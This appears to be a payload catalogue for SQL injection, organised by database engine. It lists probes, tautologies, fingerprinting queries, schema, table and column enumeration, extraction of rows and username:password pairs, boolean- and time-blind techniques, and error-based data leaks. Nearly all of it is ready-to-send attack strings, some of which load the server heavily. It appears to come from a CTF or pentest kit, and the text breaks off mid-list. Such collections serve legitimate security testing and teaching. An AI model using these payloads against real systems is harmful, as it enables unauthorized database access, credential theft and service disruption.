# Payload dictionary — the big sorted catalogue

Every payload here is a ONE-LINER in the form you'd send it —
`{v}` marks where your value lands. DBMS tags: [M]=MySQL/MariaDB,
[P]=PostgreSQL, [S]=MSSQL, [O]=Oracle, [L]=SQLite, [*]=any.
Transform rules (encoding, comments, case) live in
`waf-evasion.md`; this file is the payload corpus itself.

---

## 1. Quote/context probes — the very first sends

```text
'           "           `           )           ))
'))         ')          ")          `)          ;'
'||'        '|'         '\          '%          \'
'a''b'      'a'+'b'     'a'||'b'    0x27        %27
''          ""          ''          %2527       %bf%27
```

Send these first; the response shape (error / clean / transformed)
maps the quoting context. `detection.md` §2-§4 covers the reading.

---

## 2. Tautology / boolean probes — true/false pairs

```sql
' AND '1'='1    ' AND '1'='2      ' OR '1'='1       ' OR '1'='2
' AND 1=1-- -   ' AND 1=2-- -     ' OR 1=1-- -      ' OR 1=2-- -
' AND 'a'='a    ' AND 'a'='b      ' OR 'a'='a       ' OR 'a'='b
' AND 'x'='x    ' AND 'x'='y      ' OR 'x'='x       ' OR 'x'='y
' AND ''='      ' AND ''='x       ' OR ''='         ' OR ''='x
' AND 1-- -     ' AND 0-- -       ' OR 1-- -        ' OR 0-- -
' AND true-- -  ' AND false-- -   ' OR true-- -     ' OR false-- -
' AND (1)=(1)   ' AND (1)=(2)     ' OR (1)=(1)      ' OR (1)=(2)
1 AND 1=1-- -   1 AND 1=2-- -     1 OR 1=1-- -      1 OR 1=2-- -
1) AND (1=1     1) AND (1=2       1) OR (1=1        1) OR (1=2
')) AND (('1'='1   ')) AND (('1'='2   ')) OR (('1'='1
' AND 'x' LIKE 'x   ' AND 'x' LIKE 'y   ' OR 'x' LIKE 'x
' AND 'x' RLIKE 'x  ' AND 'x' RLIKE 'y  [M]
' AND 'a' IN ('a')                  ' AND 'a' IN ('b')
' AND (SELECT 1)=1                  ' AND (SELECT 1)=2
' AND (SELECT 'a')='a               ' AND (SELECT 'a')='b
' AND EXISTS(SELECT 1)              ' AND NOT EXISTS(SELECT 1)
' AND 1 IN (1,2)                    ' AND 1 IN (2,3)
' AND 1 BETWEEN 0 AND 2             ' AND 1 BETWEEN 2 AND 3
' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1      [*]
' AND CASE WHEN 1=2 THEN 1 ELSE 0 END=1      [*]
' AND IF(1,1,0)=1                             [M]
' AND IF(0,1,0)=1                             [M]
' AND IIF(1,1,0)=1                            [S]
' AND (1)=(SELECT 1)                          [*]
' AND 'a'||(SELECT 'b')='ab'                   [P O L]
' AND concat('a','b')='ab'                     [M P O]
' AND 0x61=0x61                                [M]
' AND CHAR(97)='a'                             [M S]
' AND CHR(97)='a'                              [P O]
' AND CHAR(97)=CHAR(97)                         [M S]
```

---

## 3. DBMS fingerprint probes

```sql
' AND @@version>0-- -                 [M S]
' AND version()>''-- -                [M P]
' AND version() LIKE '%MariaDB%'-- -   [MariaDB only]
' AND version() LIKE '%PostgreSQL%'-- -[P]
' AND sqlite_version()>''-- -          [L]
' AND H2VERSION()>''-- -               [H2]
' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%'-- -[O]
' AND (SELECT versionnumber FROM sysibm.sysversions)>0-- -  [DB2]
' AND 'a'||'b'='ab'-- -                [P O L] (0/err on M S)
' AND concat('a','b')='ab'-- -         [M P O]
' AND substring('abc',1,1)='a'-- -     [*]
' AND substr('abc',1,1)='a'-- -        [M P O L] (err S)
' AND length('abc')=3-- -              [*]
' AND len('abc')=3-- -                 [S]
' AND 1=CONVERT(int,'1')-- -           [S]
' AND 1=CAST('1' AS int)-- -           [P S M]
' AND INSTR('abc','b')=2-- -           [M O L]
' AND position('b' in 'abc')=2-- -     [P]
' AND charindex('b','abc')=2-- -       [S]
' AND locate('b','abc')=2-- -          [M]
' AND hex('a')='61'-- -                [M P L]
' AND unhex('61')='a'-- -              [M]
' AND md5('a')=lower(md5('a'))-- -     [M P]
' AND 1=to_number('1')-- -             [O]
' AND to_char(1)='1'-- -               [O P]
' AND to_varchar(1)='1'-- -            [S P]
' AND IFNULL(1,2)=1-- -                [M]
' AND ISNULL(1,2)=1-- -                [S]
' AND COALESCE(NULL,1)=1-- -           [*]
' AND NVL(NULL,1)=1-- -                [O]
' AND IF(1,2,3)=2-- -                  [M H2]
' AND IIF(1,2,3)=2-- -                 [S L H2]
' AND ELT(1,'a','b')='a'-- -           [M]
' AND FIELD('a','b','a')=2-- -         [M]
' AND MAKE_SET(1,'a','b')='a'-- -      [M]
' AND INET_ATON('1.2.3.4')>0-- -       [M]
' AND sysdate IS NOT NULL-- -          [O M]
' AND current_date IS NOT NULL-- -     [*]
' AND current_timestamp IS NOT NULL-- -[*]
' AND now() IS NOT NULL-- -            [M P]
' AND getdate() IS NOT NULL-- -        [S]
' AND sysdate=systimestamp-- -         [O] (≈)
' AND user()>''-- -                    [M S]
' AND current_user IS NOT NULL-- -     [*]
' AND system_user IS NOT NULL-- -      [M S]
' AND session_user IS NOT NULL-- -     [P]
' AND SUSER_SNAME() IS NOT NULL-- -    [S]
' AND database()>''-- -                [M]
' AND db_name()>''-- -                 [S]
' AND current_database()>''-- -        [P]
' AND SYS_CONTEXT('USERENV','DB_NAME') IS NOT NULL-- -   [O]
' AND (SELECT 1 FROM dual)=1-- -       [M O]  (err P L S)
' AND (SELECT 1 FROM sysibm.sysdummy1)=1-- -             [DB2]
' AND (SELECT 1 FROM rdb$database)=1-- -                 [Firebird]
' AND (SELECT 1 FROM information_schema.tables)=1-- -    [M P S H2]
' AND (SELECT 1 FROM sqlite_master)=1-- -                [L]
' AND (SELECT 1 FROM syscat.tables)=1-- -                [DB2]
' AND (SELECT 1 FROM pg_tables)=1-- -                    [P]
' AND (SELECT 1 FROM sys.tables)=1-- -                   [S]
' AND (SELECT 1 FROM all_tables)=1-- -                   [O]
' AND (SELECT 1 FROM system.tables)=1-- -                [ClickHouse]
' AND (SELECT 1 FROM M_DATABASES)=1-- -                  [HANA]
```

---

## 4. Version / current-user / db-name extraction

```sql
' UNION SELECT NULL,version(),NULL-- -            [M P]
' UNION SELECT NULL,@@version,NULL-- -            [M S]
' UNION SELECT NULL,sqlite_version(),NULL-- -     [L]
' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1-- -[O]
' UNION SELECT NULL,versionnumber,NULL FROM sysibm.sysversions-- -[DB2]
' UNION SELECT NULL,H2VERSION(),NULL-- -          [H2]
' UNION SELECT NULL,user(),NULL-- -               [M]
' UNION SELECT NULL,current_user,NULL-- -         [*]
' UNION SELECT NULL,system_user,NULL-- -          [M S]
' UNION SELECT NULL,SUSER_SNAME(),NULL-- -        [S]
' UNION SELECT NULL,session_user,NULL-- -         [P]
' UNION SELECT NULL,user,NULL FROM dual-- -       [O]
' UNION SELECT NULL,database(),NULL-- -           [M]
' UNION SELECT NULL,db_name(),NULL-- -            [S]
' UNION SELECT NULL,current_database(),NULL-- -   [P]
' UNION SELECT NULL,SYS_CONTEXT('USERENV','DB_NAME'),NULL
   FROM dual-- -                                   [O]
' UNION SELECT NULL,@@datadir,NULL-- -            [M]
' UNION SELECT NULL,@@basedir,NULL-- -            [M]
' UNION SELECT NULL,@@hostname,NULL-- -           [M]
' UNION SELECT NULL,@@version_comment,NULL-- -    [M]
' UNION SELECT NULL,@@secure_file_priv,NULL-- -   [M]
' UNION SELECT NULL,current_setting('data_directory'),NULL-- -[P]
' UNION SELECT NULL,current_setting('config_file'),NULL-- -  [P]
' UNION SELECT NULL,inet_server_addr(),NULL-- -   [P]
' UNION SELECT NULL,inet_server_port(),NULL-- -   [P]
' UNION SELECT NULL,current_setting('port'),NULL-- -[P]
' UNION SELECT NULL,SERVERPROPERTY('MachineName'),NULL-- -[S]
' UNION SELECT NULL,SERVERPROPERTY('InstanceName'),NULL-- -[S]
' UNION SELECT NULL,SERVERPROPERTY('Edition'),NULL-- -   [S]
' UNION SELECT NULL,SERVERPROPERTY('ProductVersion'),NULL-- -[S]
' UNION SELECT NULL,SERVERPROPERTY('ServerName'),NULL-- - [S]
' UNION SELECT NULL,utl_inaddr.get_host_name(),NULL FROM dual-- -[O]
' UNION SELECT NULL,utl_inaddr.get_host_address(),NULL FROM dual-- -[O]
' UNION SELECT NULL,sys_context('USERENV','HOST'),NULL FROM dual-- -[O]
' UNION SELECT NULL,sys_context('USERENV','OS_USER'),NULL FROM dual-- -[O]
' UNION SELECT NULL,sys_context('USERENV','IP_ADDRESS'),NULL FROM dual-- -[O]
' UNION SELECT NULL,sys_context('USERENV','TERMINAL'),NULL FROM dual-- -[O]
' UNION SELECT NULL,sys_context('USERENV','SESSION_USER'),NULL FROM dual-- -[O]
' UNION SELECT NULL,sys_context('USERENV','CURRENT_SCHEMA'),NULL FROM dual-- -[O]
' UNION SELECT NULL,sys_context('USERENV','SERVICE_NAME'),NULL FROM dual-- -[O]
' UNION SELECT NULL,file,NULL FROM pragma_database_list-- -    [L]
' UNION SELECT NULL,name,NULL FROM pragma_compile_options-- -  [L]
' UNION SELECT NULL,sqlite_source_id(),NULL-- -    [L]
' UNION SELECT NULL,@@language,NULL-- -            [M S]
' UNION SELECT NULL,@@character_set_database,NULL-- -[M]
' UNION SELECT NULL,@@collation_database,NULL-- -  [M]
' UNION SELECT NULL,@@log_bin,NULL-- -             [M]
' UNION SELECT NULL,@@read_only,NULL-- -           [M]
' UNION SELECT NULL,@@gtid_mode,NULL-- -           [M]
' UNION SELECT NULL,@@performance_schema,NULL-- -  [M]
' UNION SELECT NULL,@@plugin_dir,NULL-- -          [M] (UDF target)
' UNION SELECT NULL,@@tmpdir,NULL-- -              [M]
' UNION SELECT NULL,@@socket,NULL-- -              [M]
' UNION SELECT NULL,@@pid_file,NULL-- -            [M]
' UNION SELECT NULL,@@log_error,NULL-- -           [M]
' UNION SELECT NULL,@@general_log_file,NULL-- -    [M]
' UNION SELECT NULL,@@slow_query_log_file,NULL-- - [M]
' UNION SELECT NULL,@@license,NULL-- -             [M]
' UNION SELECT NULL,@@max_connections,NULL-- -     [M]
' UNION SELECT NULL,@@max_allowed_packet,NULL-- -  [M]
' UNION SELECT NULL,@@innodb_data_file_path,NULL-- -[M]
' UNION SELECT NULL,@@sync_binlog,NULL-- -         [M]
' UNION SELECT NULL,@@expire_logs_days,NULL-- -    [M]
' UNION SELECT NULL,@@binlog_format,NULL-- -       [M]
' UNION SELECT NULL,@@sql_mode,NULL-- -            [M]
' UNION SELECT NULL,@@lower_case_table_names,NULL-- -[M]
```

---

## 5. Schema enumeration — databases/schemas

```sql
-- MySQL/MariaDB:
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -
' UNION SELECT NULL,group_concat(schema_name),NULL
   FROM information_schema.schemata-- -
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata
   WHERE schema_name NOT IN ('mysql','information_schema','sys',
   'performance_schema')-- -
' UNION SELECT NULL,database(),NULL-- -   current db
' AND (SELECT COUNT(*) FROM information_schema.schemata)>N-- -   blind

-- PostgreSQL:
' UNION SELECT NULL,datname,NULL FROM pg_database-- -
' UNION SELECT NULL,string_agg(datname,','),NULL FROM pg_database-- -
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -
' UNION SELECT NULL,nspname,NULL FROM pg_namespace-- -
' AND (SELECT COUNT(*) FROM pg_database)>N-- -

-- MSSQL:
' UNION SELECT NULL,name,NULL FROM master..sysdatabases-- -
' UNION SELECT NULL,name,NULL FROM sys.databases-- -
' UNION SELECT NULL,DB_NAME(1),NULL-- -DB_NAME(2)...  -- per-index
' UNION SELECT NULL,string_agg(name,','),NULL FROM sys.databases-- - 2017+
' UNION SELECT NULL,(SELECT name FROM sys.databases FOR XML PATH('')),
   NULL-- -                                          -- xml concat
' AND (SELECT COUNT(*) FROM sys.databases)>N-- -

-- Oracle (schemas, not databases):
' UNION SELECT NULL,owner,NULL FROM all_tables WHERE ROWNUM=1-- -
' UNION SELECT NULL,listagg(owner,',') WITHIN GROUP (ORDER BY 1),
   NULL FROM (SELECT DISTINCT owner FROM all_tables)-- -
' UNION SELECT NULL,username,NULL FROM all_users-- -
' UNION SELECT NULL,listagg(username,',') WITHIN GROUP(ORDER BY 1),
   NULL FROM all_users-- -
' UNION SELECT NULL,name,NULL FROM v$database-- -

-- SQLite: single db + attached
' UNION SELECT NULL,file,NULL FROM pragma_database_list-- -
' UNION SELECT NULL,name,NULL FROM pragma_database_list-- -

-- DB2:
' UNION SELECT NULL,tabschema,NULL FROM syscat.tables-- -
' UNION SELECT NULL,name,NULL FROM sysibm.sysdatabases-- -  (rare)

-- H2:
' UNION SELECT NULL,TABLE_SCHEMA,NULL FROM INFORMATION_SCHEMA.TABLES-- -

-- ClickHouse:
' UNION SELECT NULL,database,NULL FROM system.tables-- -
' UNION SELECT NULL,name,NULL FROM system.databases-- -

-- HANA:
' UNION SELECT NULL,SCHEMA_NAME,NULL FROM SYS.TABLES-- -
' UNION SELECT NULL,DATABASE_NAME,NULL FROM M_DATABASES-- -
```

---

## 6. Table enumeration

```sql
-- MySQL:
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables
   WHERE table_schema=database()-- -
' UNION SELECT NULL,group_concat(table_name),NULL FROM
   information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables
   WHERE table_schema='target_db'-- -
' UNION SELECT NULL,concat(table_schema,'.',table_name),NULL
   FROM information_schema.tables WHERE table_schema NOT IN
   ('mysql','information_schema','sys','performance_schema')-- -
' AND (SELECT COUNT(*) FROM information_schema.tables
   WHERE table_schema=database())>N-- -

-- PG:
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables
   WHERE table_schema='public'-- -
' UNION SELECT NULL,tablename,NULL FROM pg_tables
   WHERE schemaname='public'-- -
' UNION SELECT NULL,relname,NULL FROM pg_class WHERE relkind='r'
   AND relnamespace=(SELECT oid FROM pg_namespace
   WHERE nspname='public')-- -
' UNION SELECT NULL,string_agg(tablename,','),NULL FROM pg_tables
   WHERE schemaname='public'-- -
' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE
   schemaname NOT IN ('pg_catalog','information_schema')-- -

-- MSSQL:
' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'-- -
' UNION SELECT NULL,name,NULL FROM sys.tables-- -
' UNION SELECT NULL,schema_name(schema_id)+'.'+name,NULL
   FROM sys.tables-- -
' UNION SELECT NULL,(SELECT name FROM sys.tables FOR XML PATH('')),
   NULL-- -

-- Oracle:
' UNION SELECT NULL,table_name,NULL FROM all_tables
   WHERE owner='TARGET'-- -
' UNION SELECT NULL,table_name,NULL FROM user_tables-- -
' UNION SELECT NULL,listagg(table_name,',') WITHIN GROUP(ORDER BY 1),
   NULL FROM user_tables-- -
' UNION SELECT NULL,table_name,NULL FROM all_tables
   WHERE owner NOT IN ('SYS','SYSTEM','XDB')-- -

-- SQLite:
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'-- -
' UNION SELECT NULL,group_concat(name),NULL FROM sqlite_master
   WHERE type='table'-- -
' UNION SELECT NULL,name,NULL FROM sqlite_temp_master-- -
' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE name
   NOT LIKE 'sqlite_%'-- -

-- DB2:
' UNION SELECT NULL,tabname,NULL FROM syscat.tables
   WHERE tabschema=current_schema-- -

-- H2:
' UNION SELECT NULL,TABLE_NAME,NULL FROM INFORMATION_SCHEMA.TABLES
   WHERE TABLE_SCHEMA='PUBLIC'-- -

-- ClickHouse:
' UNION SELECT NULL,name,NULL FROM system.tables WHERE
   database=currentDatabase()-- -

-- Informix:
' UNION SELECT NULL,tabname,NULL FROM systables WHERE tabid>99-- -

-- Firebird:
' UNION SELECT NULL,rdb$relation_name,NULL FROM rdb$relations
   WHERE rdb$system_flag=0-- -

-- HANA:
' UNION SELECT NULL,TABLE_NAME,NULL FROM SYS.TABLES
   WHERE SCHEMA_NAME=current_schema-- -
```

---

## 7. Column enumeration

```sql
-- MySQL:
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns
   WHERE table_name='users'-- -
' UNION SELECT NULL,group_concat(column_name),NULL FROM
   information_schema.columns WHERE table_name='users'-- -
' UNION SELECT NULL,concat(column_name,'(',column_type,')'),NULL
   FROM information_schema.columns WHERE table_name='users'-- -

-- PG:
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns
   WHERE table_name='users'-- -
' UNION SELECT NULL,string_agg(column_name,','),NULL FROM
   information_schema.columns WHERE table_name='users'-- -
' UNION SELECT NULL,attname,NULL FROM pg_attribute a JOIN pg_class c
   ON a.attrelid=c.oid WHERE c.relname='users' AND a.attnum>0-- -

-- MSSQL:
' UNION SELECT NULL,name,NULL FROM syscolumns WHERE id=OBJECT_ID('users')-- -
' UNION SELECT NULL,c.name,NULL FROM sys.columns c JOIN sys.tables t
   ON c.object_id=t.object_id WHERE t.name='users'-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns
   WHERE table_name='users'-- -

-- Oracle:
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns
   WHERE table_name='USERS'-- -
' UNION SELECT NULL,column_name,NULL FROM user_tab_columns
   WHERE table_name='USERS'-- -
' UNION SELECT NULL,listagg(column_name,',') WITHIN GROUP(ORDER BY
   column_id),NULL FROM user_tab_columns WHERE table_name='USERS'-- -

-- SQLite (the .sql field = full CREATE):
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE name='users'-- -
' UNION SELECT NULL,name,NULL FROM pragma_table_info('users')-- -

-- DB2:
' UNION SELECT NULL,colname,NULL FROM syscat.columns
   WHERE tabname='USERS'-- -

-- H2:
' UNION SELECT NULL,COLUMN_NAME,NULL FROM INFORMATION_SCHEMA.COLUMNS
   WHERE TABLE_NAME='USERS'-- -

-- ClickHouse:
' UNION SELECT NULL,name,NULL FROM system.columns WHERE table='users'-- -

-- Informix:
' UNION SELECT NULL,colname,NULL FROM syscolumns WHERE tabid=
   (SELECT tabid FROM systables WHERE tabname='users')-- -

-- Firebird:
' UNION SELECT NULL,rdb$field_name,NULL FROM rdb$relation_fields
   WHERE rdb$relation_name='USERS'-- -
```

---

## 8. Row extraction — the payload pulls the actual data

```sql
-- single value:
' UNION SELECT NULL,flag,NULL FROM secrets LIMIT 1-- -     [M P L]
' UNION SELECT NULL,flag,NULL FROM secrets WHERE ROWNUM=1-- -  [O]
' UNION SELECT NULL,TOP 1 flag,NULL FROM secrets-- -       [S — wrong pos]
' UNION SELECT NULL,(SELECT TOP 1 flag FROM secrets),NULL-- -  [S]
' UNION SELECT NULL,flag,NULL FROM (SELECT flag,ROWNUM r FROM
   secrets) WHERE r=1-- -                                   [O]

-- aggregation — whole column in one cell:
' UNION SELECT NULL,group_concat(flag),NULL FROM secrets-- -   [M L]
' UNION SELECT NULL,group_concat(flag,0x0a),NULL FROM secrets-- -[M]
' UNION SELECT NULL,group_concat(flag SEPARATOR '|'),NULL
   FROM secrets-- -                                            [M]
' UNION SELECT NULL,string_agg(flag,','),NULL FROM secrets-- - [P]
' UNION SELECT NULL,array_to_string(array_agg(flag),','),NULL
   FROM secrets-- -                                            [P]
' UNION SELECT NULL,json_agg(flag),NULL FROM secrets-- -       [P]
' UNION SELECT NULL,(SELECT flag FROM secrets FOR XML PATH('')),
   NULL-- -                                                    [S]
' UNION SELECT NULL,STUFF((SELECT ','+flag FROM secrets
   FOR XML PATH('')),1,1,''),NULL-- -                          [S]
' UNION SELECT NULL,string_agg(flag,','),NULL FROM secrets-- - [S 2017+]
' UNION SELECT NULL,listagg(flag,',') WITHIN GROUP(ORDER BY 1),
   NULL FROM secrets-- -                                       [O]
' UNION SELECT NULL,xmlagg(xmlelement(e,flag||',')).getclob(),
   NULL FROM secrets-- -                                       [O]
' UNION SELECT NULL,json_arrayagg(flag),NULL FROM secrets-- -  [M 5.7.22+]
' UNION SELECT NULL,json_object_agg(username,password),NULL
   FROM users-- -                                              [P]

-- multi-col concatenation per row:
' UNION SELECT NULL,concat(username,':',password),NULL FROM users-- -[M]
' UNION SELECT NULL,username||':'||password,NULL FROM users-- -[P O L]
' UNION SELECT NULL,username+':'+password,NULL FROM users-- -  [S]
' UNION SELECT NULL,concat_ws(':',username,password),NULL
   FROM users-- -                                              [M]
' UNION SELECT NULL,group_concat(username||':'||password),NULL
   FROM users-- -                                              [L]
' UNION SELECT NULL,group_concat(username,0x3a,password),NULL
   FROM users-- -                                              [M]
' UNION SELECT NULL,(SELECT username+'|'+password+'|'+email
   FROM users FOR XML PATH('')),NULL-- -                       [S]
' UNION SELECT NULL,json_group_array(username||':'||password),
   NULL FROM users-- -                                         [L]
' UNION SELECT NULL,json_agg(row(username,password)),NULL
   FROM users-- -                                              [P]

-- paging through rows:
' UNION SELECT NULL,flag,NULL FROM secrets LIMIT 0,1-- -   [M P L]
' UNION SELECT NULL,flag,NULL FROM secrets LIMIT 1 OFFSET 1-- -[P L]
' UNION SELECT NULL,flag,NULL FROM secrets LIMIT 1,1-- -   [M]
' UNION SELECT NULL,flag,NULL FROM secrets OFFSET 1 ROWS
   FETCH NEXT 1 ROWS ONLY-- -                                [P S]
' UNION SELECT NULL,(SELECT flag FROM secrets ORDER BY id
   OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),NULL-- -            [S]
' UNION SELECT NULL,flag,NULL FROM (SELECT flag,ROWNUM r
   FROM secrets WHERE ROWNUM<=5) WHERE r=5-- -               [O]
```

---

## 9. Boolean-blind extraction — one bit per request

```sql
-- charset-aware, any DBMS:
' AND SUBSTRING((SELECT flag FROM secrets LIMIT 1),1,1)='f'-- -
' AND SUBSTRING((SELECT flag FROM secrets LIMIT 1),1,1)>'a'-- -
' AND ASCII(SUBSTRING((SELECT flag FROM secrets LIMIT 1),1,1))>100-- -
' AND ORD(SUBSTRING((SELECT flag FROM secrets LIMIT 1),1,1))>100-- -[M]
' AND UNICODE(SUBSTR((SELECT flag FROM secrets LIMIT 1),1,1))>100-- -[L]
' AND SUBSTR((SELECT flag FROM secrets LIMIT 1),1,1)='f'-- -[M P O L]
' AND LEFT((SELECT flag FROM secrets LIMIT 1),1)='f'-- -  [M S]
' AND RIGHT((SELECT flag FROM secrets LIMIT 1),1)='}'-- - [M S]
' AND SUBSTRING((SELECT TOP 1 flag FROM secrets),1,1)='f'-- -[S]
' AND SUBSTR((SELECT flag FROM secrets WHERE ROWNUM=1),1,1)='f'-- -[O]
' AND (SELECT flag FROM secrets LIMIT 1) LIKE 'f%'-- -
' AND (SELECT flag FROM secrets LIMIT 1) LIKE BINARY 'f%'-- -[M cs]
' AND (SELECT flag FROM secrets LIMIT 1) REGEXP '^f'-- -  [M]
' AND (SELECT flag FROM secrets LIMIT 1) ~ '^f'-- -       [P]
' AND (SELECT flag FROM secrets LIMIT 1) SIMILAR TO 'f%'-- -[P]
' AND (SELECT TOP 1 flag FROM secrets) LIKE 'f%'-- -      [S]
' AND (SELECT flag FROM secrets WHERE ROWNUM=1) LIKE 'f%'-- -[O]
' AND instr((SELECT flag FROM secrets LIMIT 1),'f')=1-- - [M O L]
' AND position('f' in (SELECT flag FROM secrets LIMIT 1))=1-- -[P]
' AND charindex('f',(SELECT TOP 1 flag FROM secrets))=1-- -[S]
' AND locate('f',(SELECT flag FROM secrets LIMIT 1))=1-- - [M]
' AND hex(substr((SELECT flag FROM secrets LIMIT 1),1,1))='66'-- -[L M P]
' AND substr(hex((SELECT flag FROM secrets LIMIT 1)),1,2)='666c'-- -[L]
' AND LENGTH((SELECT flag FROM secrets LIMIT 1))>30-- -    [*]
' AND LENGTH((SELECT flag FROM secrets LIMIT 1))=38-- -    [*]
' AND char_length((SELECT flag FROM secrets LIMIT 1))=38-- -[M P]
' AND octet_length((SELECT flag FROM secrets LIMIT 1))=38-- -[P]
' AND LEN((SELECT TOP 1 flag FROM secrets))=38-- -         [S]
' AND BIT_LENGTH((SELECT flag FROM secrets LIMIT 1))=304-- -[M]
' AND (SELECT flag FROM secrets LIMIT 1) BETWEEN 'a' AND 'm'-- -
' AND SUBSTRING((SELECT flag),7,1) IN ('0','1','2','3','4','5','6','7')-- -
' AND SUBSTRING((SELECT flag),7,1) BETWEEN 'a' AND 'm'-- -
' AND ELT(ASCII(SUBSTRING((SELECT flag),1,1))>100,'a','b')='b'-- -[M]
' AND (SELECT flag FROM secrets LIMIT 1) GLOB 'f*'-- -    [L]
' AND (SELECT flag FROM secrets LIMIT 1) MATCHES 'f*'-- - [Informix]
' AND (SELECT flag FROM secrets LIMIT 1) ILIKE 'F%'-- -   [P cs-insensitive]
' AND quote((SELECT flag FROM secrets LIMIT 1)) LIKE ''f%'-- -[L]
' AND unicode(substr((SELECT flag FROM secrets),1,1))=102-- -[L]
' AND substr((SELECT flag FROM secrets),1,4)='flag'-- -   [*]
' AND left((SELECT flag FROM secrets),5)='flag{'-- -      [M S]
' AND mid((SELECT flag FROM secrets),1,5)='flag{'-- -     [M]
' AND lpad((SELECT flag FROM secrets),5,' ')='flag{'-- -  [M]
' AND rpad((SELECT flag FROM secrets),5,' ')='flag{'-- -  [M]
' AND repeat('a',1)='a'-- -                                [M P]
' AND replace((SELECT flag FROM secrets),'flag{','')<>
   (SELECT flag FROM secrets)-- -                          [*]
' AND (SELECT COUNT(*) FROM secrets)>0-- -                 [*]
' AND (SELECT COUNT(DISTINCT flag) FROM secrets)>0-- -     [*]
' AND EXISTS(SELECT 1 FROM secrets)-- -                    [*]
' AND (SELECT flag FROM secrets) IS NOT NULL-- -           [*]
```

---

## 10. Time-blind payloads

```sql
-- MySQL:
' AND IF(1=1,SLEEP(3),0)-- -
' AND IF(cond,SLEEP(3),0)-- -
' AND IF(cond,BENCHMARK(5000000,MD5('x')),0)-- -
' AND (SELECT SLEEP(3))-- -
' AND SLEEP(3)-- -                       -- sometimes works bare
' UNION SELECT SLEEP(3)-- -               -- UNION-based delay
' AND IF(cond,(SELECT SLEEP(3)),0)-- -
' AND ELT(cond,SLEEP(3),0)-- -            -- ELT trick
' AND IF(cond,BENCHMARK(10000000,SHA1('x')),1)-- -
' OR IF(cond,SLEEP(3),0)-- -               -- OR-form for auth
' AND (CASE WHEN cond THEN SLEEP(3) ELSE 0 END)-- -
' AND (SELECT CASE WHEN cond THEN sleep(3) ELSE 0 END FROM dual)-- -

-- PostgreSQL:
' AND 1=(SELECT 1 FROM pg_sleep(3))-- -
' AND (SELECT pg_sleep(3)) IS NOT NULL-- -   -- actually returns void
' OR 1=(SELECT 1 FROM pg_sleep(3))-- -
' AND cond AND 1=(SELECT 1 FROM pg_sleep(3))-- -
' AND (SELECT CASE WHEN cond THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -
'; SELECT pg_sleep(3)-- -                     -- stacked
' AND 1=(SELECT 1 FROM generate_series(1,10000000))-- -   -- CPU burn

-- MSSQL:
'; WAITFOR DELAY '0:0:3'-- -
' AND 1=1 WAITFOR DELAY '0:0:3'-- -          -- in some parsers
' IF (cond) WAITFOR DELAY '0:0:3'-- -
'; IF (cond) WAITFOR DELAY '0:0:3'-- -
' AND (CASE WHEN cond THEN 1/0 ELSE 1 END)=1-- - -- error-based delay alt
'; BEGIN IF (cond) WAITFOR DELAY '0:0:3' END-- -

-- Oracle:
' AND 1=dbms_pipe.receive_message('x',3)-- -  -- sleeps 3s
' AND 1=(SELECT dbms_pipe.receive_message('x',3) FROM dual)-- -
' AND 1=CASE WHEN cond THEN dbms_pipe.receive_message('x',3)
   ELSE 1 END-- -
' AND 1=utl_inaddr.get_host_name('nonexistent.invalid')-- -  -- DNS delay
' AND 1=(SELECT COUNT(*) FROM all_objects a,all_objects b)-- - -- heavy

-- SQLite (no sleep fn — CPU/alloc torture):
' AND randomblob(200000000)>0-- -
' AND like('AAAAAAAAAAAAAAAA',upper(hex(randomblob(50000000))))-- -
' AND (SELECT COUNT(*) FROM sqlite_master a,sqlite_master b,
   sqlite_master c)>0-- -
' AND cond AND (SELECT like('AAAAAAA',upper(hex(randomblob(1e8)))))-- -

-- MySQL heavy-query alt:
' AND (SELECT COUNT(*) FROM information_schema.tables a,
   information_schema.tables b,information_schema.tables c)>0-- -
' AND (SELECT COUNT(*) FROM mysql.db a,mysql.db b,mysql.db c)>0-- -
```

---

## 11. Error-echo payloads (one request per chunk)

```sql
-- MySQL:
' AND extractvalue(1,concat(0x7e,(SELECT flag FROM secrets)))-- -
' AND updatexml(1,concat(0x7e,(SELECT flag FROM secrets)),1)-- -
' AND extractvalue(1,concat(0x7e,MID((SELECT flag),33,32)))-- -
' AND updatexml(1,concat(0x7e,version()),1)-- -
' AND extractvalue(1,concat(0x7e,user()))-- -
' AND extractvalue(1,concat(0x7e,database()))-- -
' AND extractvalue(1,concat(0x7e,@@version))-- -
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name)
   FROM information_schema.tables WHERE table_schema=database())))-- -
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM
   secrets),FLOOR(RAND(0)*2))x FROM information_schema.tables
   GROUP BY x)a)-- -                                   -- dup entry
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag),
   FLOOR(RAND()*2))x FROM users GROUP BY x)a)-- -       -- RAND not RAND(0)
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION
   SELECT 3)x GROUP BY CONCAT((SELECT flag),FLOOR(RAND(0)*2)))-- -
' AND (SELECT !(x-~0) FROM (SELECT (SELECT flag)x)a)-- - -- bigint overflow
' AND (SELECT EXP(~(SELECT flag)))-- -                  -- exp overflow
' AND (SELECT !x-~0 FROM (SELECT flag x FROM secrets)a)-- -
' AND 1=(SELECT GTID_SUBSET((SELECT flag),1))-- -        -- 5.6+ echo
